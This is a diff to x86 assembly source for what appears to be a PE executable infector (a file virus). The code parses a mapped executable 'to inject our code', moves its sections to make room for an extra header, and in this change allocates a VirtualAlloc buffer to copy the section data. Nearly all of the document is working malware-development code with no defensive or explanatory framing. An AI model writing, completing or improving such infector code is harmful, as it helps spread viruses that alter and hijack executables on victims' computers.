@@ -7,7 +7,7 @@ include	utils.asm
 
 ; Parse and modify the executable mapped in memory to inject our code.
 ; ebx = delta offset
-infect_file PROC NEAR fileptr:DWORD
+infect_file PROC NEAR fileptr:DWORD, virtualalloc_addr:DWORD
 
 LOCAL	lastsec_ptrtorawdata:DWORD
 LOCAL	lastsec_sizeofrawdata:DWORD
@@ -26,6 +26,7 @@ LOCAL	sectionalignment:DWORD
 LOCAL	pointertorawdata:DWORD
 LOCAL	oldentrypoint:DWORD
 LOCAL	ptr_sectionhdrtable:DWORD
+LOCAL	tmpbuf:DWORD
 
 	pushad
 
@@ -104,10 +105,10 @@ LOCAL	ptr_sectionhdrtable:DWORD
 ; --------------------------------------> If the first section starts before 0x400 in the file, we won't have enough space for our extra header.
 ; --------------------------------------> That's why if it is the case we need to move all the sections in the file by filealignment bytes.
 
-	mov		ecx, ptr_sizeofheaders
-	mov		ecx, [ecx]
-	cmp		ecx, 0400h
-;	jae		dont_move_sections			; If header is already big enough we don't need to move everything.
+	; mov		ecx, ptr_sizeofheaders
+	; mov		ecx, [ecx]
+	; cmp		ecx, 0400h
+	; jae		dont_move_sections			; If header is already big enough we don't need to move everything.
 
 	push	esi							; esi -> IMAGE_SECTION_HEADER[last]
 
@@ -118,7 +119,37 @@ LOCAL	ptr_sectionhdrtable:DWORD
 	add		edi, esi					; destination is just 1 filealignment further.
 	mov		edx, lastsec_ptrtorawdata
 	add		edx, lastsec_sizeofrawdata
-	call	my_memmove					; Moved all the sections 1 filealignment further in the file.
+	mov		ecx, ptr_sectionhdrtable	;
+	sub		edx, [ecx + 014h]			; edx -= IMAGE_SECTION_HEADER[0].PointerToRawData. We don't copy the headers and padding to first section.
+
+	; Now, edi -> destination, esi -> source, edx = quantity.
+	; Need to malloc a temporary buffer to move the overlapping fields. Stack will explode if we use it.
+
+	push	edi
+	push	esi
+	push	edx							; Save registers b/c of function call.
+
+	push    04h							; read/write permissions
+	push    00001000h					; MEM_COMMIT
+	push    edx							; size to allocate
+	push    0							; address. NULL == we want a new address
+	call    virtualalloc_addr			; VirtualAlloc()
+	mov     tmpbuf, eax
+	cmp		eax, 0
+	je		infect_err
+
+	pop		edx
+	pop		esi
+	pop		edi							; Restore registers after function call.
+
+	push	edi
+	mov		edi, tmpbuf
+	call	my_memcpy					; copy sections to tmpbuf
+	pop		edi							; edi -> destination
+	mov		esi, tmpbuf
+	call	my_memcpy					; copy sections back to mapped file.
+
+	; TODO: free tmpbuf
 
 ; --------------------------------------> Update all section headers for new sections offsets in file, ie add filealignment to their offset.
 
